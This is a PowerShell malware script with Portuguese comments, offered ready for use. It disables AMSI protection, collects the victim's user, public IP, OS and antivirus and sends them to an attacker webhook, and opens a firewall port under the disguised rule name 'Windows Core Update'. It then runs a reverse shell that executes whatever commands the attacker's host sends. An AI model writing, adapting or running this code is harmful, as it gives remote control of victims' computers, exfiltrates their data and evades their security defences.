# --- BYPASS AMSI (Desativa a proteção em tempo real do PowerShell) ---
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$b=$a.GetField('amsiInitFailed','NonPublic,Static');
$b.SetValue($null,$true);

# --- CONFIGURAÇÃO ---
$WH = "SUA_WEBHOOK_URL_AQUI"
$MyIP = "SEU_IP_OU_NOIP" # O seu IP para receber a conexão
$MyPort = 4444

# --- COLETA DE DADOS (SYSTEM INFO) ---
$ComputerName = $env:COMPUTERNAME
$PublicIP = (Invoke-WebRequest -uri "http://ifconfig.me/ip" -UseBasicParsing).Content.Trim()
$User = $env:USERNAME
$OS = (Get-CimInstance Win32_OperatingSystem).Caption
$AV = (Get-CimInstance -Namespace root/SecurityCenter2 -Class AntiVirusProduct).displayName
if (!$AV) { $AV = "Nenhum detectado" }

# --- WEBHOOK ESTILIZADO (EMBED) ---
$Payload = @{
    embeds = @(@{
        title = "🔴 Sistema Alvo Conectado!"
        color = 16711680
        thumbnail = @{ url = "https://cdn-icons-png.flaticon.com/512/6861/6861362.png" }
        fields = @(
            @{ name = "👤 Usuário"; value = "``$User``"; inline = $true }
            @{ name = "🌐 IP Público"; value = "``$PublicIP``"; inline = $true }
            @{ name = "🖥️ OS"; value = "``$OS``"; inline = $false }
            @{ name = "🛡️ Antivírus"; value = "``$AV``"; inline = $true }
            @{ name = "⚙️ Comando"; value = "``nc -lvnp $MyPort``"; inline = $false }
        )
        footer = @{ text = "Aguardando conexão reversa..." }
    })
} | ConvertTo-Json

Invoke-RestMethod -Uri $WH -Method Post -Body $Payload -ContentType "application/json"

# --- PERSISTÊNCIA E LIBERAÇÃO ---
# Abre a porta no firewall local silenciosamente
netsh advfirewall firewall add rule name="Windows Core Update" dir=in action=allow protocol=TCP localport=$MyPort > $null

# --- REVERSE SHELL (O CONTROLE REMOTO) ---
$c = New-Object System.Net.Sockets.TCPClient($MyIP, $MyPort)
$s = $c.GetStream();[byte[]]$b = 0..65535|%{0}
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i)
    $sb = (iex $d 2>&1 | Out-String )
    $sb2 = $sb + 'PS ' + (pwd).Path + '> '
    $x = ([text.encoding]::ASCII).GetBytes($sb2)
    $s.Write($x,0,$x.Length)
    $s.Flush()
}
